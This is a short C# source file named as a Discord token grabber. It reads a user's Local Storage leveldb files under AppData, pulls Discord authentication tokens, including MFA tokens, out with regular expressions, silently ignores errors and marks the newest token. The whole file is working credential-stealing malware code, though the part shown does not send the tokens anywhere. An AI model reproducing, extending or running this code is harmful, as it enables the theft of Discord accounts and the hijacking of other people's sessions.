using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace DiscordTokenGrabber;

public static class Grabber
{
	public static bool TokensFound { get; private set; }

	public static List<string> GetTokens(string dir, bool checkLogs = false)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\" + dir + "\\Local Storage\\leveldb");
		List<string> list = new List<string>();
		try
		{
			FileInfo[] files = directoryInfo.GetFiles(checkLogs ? "*.log" : "*.ldb");
			foreach (FileInfo fileInfo in files)
			{
				string input = fileInfo.OpenText().ReadToEnd();
				foreach (Match item in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
				{
					list.Add(item.Value);
				}
				foreach (Match item2 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
				{
					list.Add(item2.Value);
				}
			}
		}
		catch
		{
		}
		if (list.Count > 0)
		{
			TokensFound = true;
			list[list.Count - 1] += " - NEWEST";
		}
		return list;
	}
}
